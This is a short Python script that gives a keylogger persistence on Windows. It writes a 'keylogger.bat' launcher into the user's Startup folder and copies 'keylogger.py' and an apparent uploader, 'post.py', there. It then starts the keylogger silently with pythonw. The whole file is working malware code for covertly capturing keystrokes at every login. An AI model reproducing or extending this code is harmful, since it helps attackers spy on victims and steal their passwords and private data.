from shutil import copyfile
import subprocess
import getpass

USER_NAME = getpass.getuser()

def add_to_startup(key_file):
  request_file = "post.py"
  startup_path = r'C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup' % USER_NAME

  with open(startup_path + '\\' + "keylogger.bat", "w+") as bat_file:
    bat_file.write('python "{0}\\{1}"\npythonw "{0}\\{2}"\n'.format(startup_path, request_file, key_file))

  copyfile(key_file, startup_path + '\\' + key_file)
  copyfile(request_file, startup_path + '\\' + request_file)

  subprocess.Popen('pythonw "{0}\\{1}"'.format(startup_path, key_file), shell=False)

add_to_startup("keylogger.py")
